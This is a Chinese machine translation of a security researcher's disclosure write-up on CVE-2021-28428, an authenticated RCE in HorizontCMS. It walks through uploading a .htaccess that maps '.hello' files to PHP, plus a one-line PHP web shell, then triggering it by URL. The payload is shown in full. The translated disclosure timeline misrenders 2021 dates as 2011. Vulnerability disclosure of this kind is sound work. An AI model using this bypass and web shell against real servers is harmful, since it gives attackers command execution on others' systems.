<html>
<head>
<title>[CVE-2021–28428] Authenticated RCE found in HorizontCMS — Part 2 (PHP Filetype Bypass)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[CVE-2021–28428]在HorizontCMS中发现的已认证RCE—第2部分(PHP文件类型旁路)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb?source=collection_archive---------3-----------------------#2021-03-31">https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb?source=collection_archive---------3-----------------------#2021-03-31</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/26225a12ed369afd9f808c82988959f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W2U_j5IyL_0n0hIFXw2znw.png"/></div></div></figure><h1 id="2c38" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">介绍</h1><p id="4427" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">正如我在第1部分<a class="ae lx" href="https://bigb0ss.medium.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe" rel="noopener"><strong class="lb iu">【bug hunt】中谈到的，在HorizontCMS —第1部分(恶意插件)</strong> </a>博客中发现的经过身份验证的RCE，我们找到了一种绕过打了补丁的PHP文件类型限制上传<code class="fe ly lz ma mb b">.php</code>文件的方法。然而，执行上传的PHP文件并没有完成。</p><p id="bbca" class="pw-post-body-paragraph kz la it lb b lc mc le lf lg md li lj lk me lm ln lo mf lq lr ls mg lu lv lw im bi translated">因此，我们想选择不同的路径来上传文件，并在应用程序上执行PHP代码。</p></div><div class="ab cl mh mi hx mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="im in io ip iq"><h1 id="e478" class="kb kc it bd kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku ms kw kx ky bi translated">媒体文件上传RCE</h1><p id="9db4" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">如第1部分所述，原始文件上传漏洞(<a class="ae lx" href="https://packetstormsecurity.com/files/160046/HorizontCMS-1.0.0-beta-Shell-Upload.html" rel="noopener ugc nofollow" target="_blank">CVE-2020–27387</a>)已通过限制PHP扩展进行了补救；然而，我们发现可以通过上传任意的<code class="fe ly lz ma mb b">.htaccess</code>和<code class="fe ly lz ma mb b">*.hello</code>文件来绕过过滤器，从而执行PHP代码来获得RCE。</p><h2 id="6724" class="mt kc it bd kd mu mv dn kh mw mx dp kl lk my mz kp lo na nb kt ls nc nd kx ne bi translated">问题的复制</h2><ol class=""><li id="a187" class="nf ng it lb b lc ld lg lh lk nh lo ni ls nj lw nk nl nm nn bi translated">登录管理面板(<code class="fe ly lz ma mb b">http://&lt;HorizontCMS IP&gt;/admin/login</code>)</li><li id="c8b1" class="nf ng it lb b lc no lg np lk nq lo nr ls ns lw nk nl nm nn bi translated">转到“媒体”→“文件”</li></ol><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nt"><img src="../Images/161a39a50e01cc7e84994d43997ae324.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-_nuOPk8njl_RQKO7wV7pw.png"/></div></div></figure><p id="d143" class="pw-post-body-paragraph kz la it lb b lc mc le lf lg md li lj lk me lm ln lo mf lq lr ls mg lu lv lw im bi translated">3.上传以下<code class="fe ly lz ma mb b">test2.htaccess</code> →重命名文件名为<code class="fe ly lz ma mb b">.htaccess</code></p><pre class="nu nv nw nx gt ny mb nz oa aw ob bi"><span id="0acc" class="mt kc it mb b gy oc od l oe of"><strong class="mb iu">AddType application/x-httpd-php .hello</strong></span></pre><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div class="gh gi og"><img src="../Images/3d14d00d2cc95b4b65321727560a75a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/format:webp/1*-RqyizQfcS7ibIz-AxBQ_g.png"/></div></figure><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/ef642e79006ae2313128b207a8f66a4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/format:webp/1*Ua7xNdelUle8qfljUfa1TA.png"/></div></figure><p id="ce0a" class="pw-post-body-paragraph kz la it lb b lc mc le lf lg md li lj lk me lm ln lo mf lq lr ls mg lu lv lw im bi translated">4.上传另一个如下文件<code class="fe ly lz ma mb b">test2.php</code> →将文件名重命名为<code class="fe ly lz ma mb b">test.hello</code></p><pre class="nu nv nw nx gt ny mb nz oa aw ob bi"><span id="c53f" class="mt kc it mb b gy oc od l oe of"><strong class="mb iu">&lt;?php system($_GET['cmd']); ?&gt;</strong></span></pre><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/b3f887edc5137cf3c353a6df1505fd8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1066/format:webp/1*ozuVsXRSuxpeoMi3FQzM4Q.png"/></div></figure><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oj"><img src="../Images/961ca5086ea4f3192c6e06d1f4419e83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1042/format:webp/1*1hmLKsHLDF5gaiJ1eGdzaQ.png"/></div></div></figure><p id="abc6" class="pw-post-body-paragraph kz la it lb b lc mc le lf lg md li lj lk me lm ln lo mf lq lr ls mg lu lv lw im bi translated">然后，我们可以看到这两个文件都成功上传到了HorizontCMS应用程序的<code class="fe ly lz ma mb b"> /storage</code>文件夹下。</p><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/37f98d2641f841c4a8214b087bfecd34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1182/format:webp/1*MCJINH1zq--RHuT31W7okw.png"/></div></figure><p id="2b28" class="pw-post-body-paragraph kz la it lb b lc mc le lf lg md li lj lk me lm ln lo mf lq lr ls mg lu lv lw im bi translated">5.前往<code class="fe ly lz ma mb b">http://&lt;HorizontCMS IP/storage/test.hello?cmd=</code>寻找RCE</p><figure class="nu nv nw nx gt ju gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/52d37d2b19f54a3e27521a2fba1bd7cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1236/format:webp/1*Nuktzxbiwxnu0JzknJRBEQ.png"/></div></figure></div><div class="ab cl mh mi hx mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="im in io ip iq"><h1 id="45ec" class="kb kc it bd kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku ms kw kx ky bi translated">结论</h1><p id="c637" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这是我的好友迟的一个好主意:)，并且是在PHP应用程序上获得RCE的非常有效的文件上传攻击媒介。我们也向HorizontCMS报告了这个问题。</p></div><div class="ab cl mh mi hx mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="im in io ip iq"><h2 id="9191" class="mt kc it bd kd mu mv dn kh mw mx dp kl lk my mz kp lo na nb kt ls nc nd kx ne bi translated">披露时间表</h2><ul class=""><li id="b6f3" class="nf ng it lb b lc ld lg lh lk nh lo ni ls nj lw om nl nm nn bi translated">2011年3月16日—向HorizontCMS报告错误</li><li id="ea02" class="nf ng it lb b lc no lg np lk nq lo nr ls ns lw om nl nm nn bi translated">2011年3月16日— HorizontCMS承认该问题</li><li id="5c9c" class="nf ng it lb b lc no lg np lk nq lo nr ls ns lw om nl nm nn bi translated">2011年3月16日——CVE提出请求(MITRE)</li><li id="243f" class="nf ng it lb b lc no lg np lk nq lo nr ls ns lw om nl nm nn bi translated">05/22/21 — HorizonCMS发布了安全修补程序</li><li id="9b68" class="nf ng it lb b lc no lg np lk nq lo nr ls ns lw om nl nm nn bi translated">04/06/22—CVE—2021–28428已分配</li></ul></div></div>    
</body>
</html>